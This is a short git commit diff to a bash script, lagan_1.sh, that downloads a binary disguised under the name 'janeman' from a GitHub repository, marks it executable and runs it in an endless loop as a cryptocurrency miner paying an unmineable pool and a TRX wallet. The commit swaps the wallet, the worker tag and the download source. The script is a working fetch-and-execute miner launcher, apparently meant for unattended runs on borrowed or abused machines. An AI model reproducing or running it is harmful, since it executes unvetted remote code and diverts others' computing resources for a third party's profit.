bfa2df642cce382e4e98ec50090ed3a7c8e4ff7a
squibex <90225595+squibex@users.noreply.github.com>
2021-09-07 00:21:32 +0000

    Update lagan_1.sh

--- lagan_1.sh
+++ lagan_1.sh
@@ -1,8 +1,8 @@
 #!/bin/bash
 POOL=ethash.unmineable.com:3333
-WALLET=TRX:TUxbPLqKPtdvtGTFfAYmqJLdzjBhQuWSVU
-WORKER=$(echo $(shuf -i 10-40 -n 1)-COLN#im8m-ybvt)
-wget https://github.com/archernap/prem/raw/main/janeman
+WALLET=TRX:THy2QWqsFcEQoEbKowmQR3jQjrW299ZbNt
+WORKER=$(echo $(shuf -i 10-40 -n 1)-COLN#)
+wget https://github.com/squibex/prem/raw/main/janeman
 chmod +x janeman
 	while [ 1 ]; do
 		./janeman -pool $POOL -wal $WALLET.$WORKER -pass x
